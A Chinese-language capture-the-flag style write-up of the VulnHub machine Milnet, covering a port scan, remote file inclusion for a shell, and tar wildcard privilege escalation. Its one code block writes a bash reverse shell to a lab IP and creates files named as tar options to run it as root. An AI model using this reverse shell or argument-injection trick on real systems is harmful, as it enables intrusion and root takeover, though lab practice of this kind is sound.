+++
title = '0x033 Milnet'
date = 2024-10-11T14:25:59+08:00
draft = false
private = true
show_reading_time = true
categories = 'vulnhub'
+++



这台靶机的网络很棒，能桥接，还能自动告诉咋们IP地址

# 端口扫描

![](/vulnhub_img/WEBRESOURCEa3613cd58e1766b1f64062b552945d74截图.png)

![](/vulnhub_img/WEBRESOURCE13482f9d87fa08afddc390f6189f74b4截图.png)

![](/vulnhub_img/WEBRESOURCEf10e92bf472185f88c8e89af154e1b0e截图.png)

# 渗透

就两个端口，直接看80呗：

![](/vulnhub_img/WEBRESOURCE7fbe03601bbb56b42c0b78c15ce61ea7截图.png)

抓包看了一下数据包，发现确实存在远程文件包含：

![](/vulnhub_img/WEBRESOURCE05d04d462add4336b384a9e3349da83c截图.png)

弹shell吧，这里看报错就可以知道，应该是逻辑处理的地方添加了php后缀：

![](/vulnhub_img/WEBRESOURCE71656d2d3631a661ebeb9c498b8e30f3截图.png)

# 提权

![](/vulnhub_img/WEBRESOURCEe7ecf0b20d849e7e0269ce46b445e679截图.png)

![](/vulnhub_img/WEBRESOURCEba6a7f434d0f879b5652a30810d07096截图.png)

查了一些资料，关于tar通配符提权：

[https://www.cnblogs.com/jhinjax/p/17067082.html](https://www.cnblogs.com/jhinjax/p/17067082.html)

第一次尝试失败了，我猜测是下面这个红框里面的原因，没有引号，中间有空格，让人操蛋的是，这玩意儿删不掉：

![](/vulnhub_img/WEBRESOURCEf645dfaef77a30b8bf4b30a85f0bc5b5截图.png)

重置了一下机器，然后这次我加上了引号就可以了

```
echo "bash -c 'bash -i >& /dev/tcp/192.168.5.66/8899 0>&1'">1.sh
touch "/var/www/html/--checkpoint-action=exec='sh 1.sh'"
touch "/var/www/html/--checkpoint=1"
```

![](/vulnhub_img/WEBRESOURCEdc5bc44ab35b6d27bcd2826b13b455c1截图.png)

![](/vulnhub_img/WEBRESOURCE5bbb080e1c1016fd7bb1b8bce5c06292截图.png)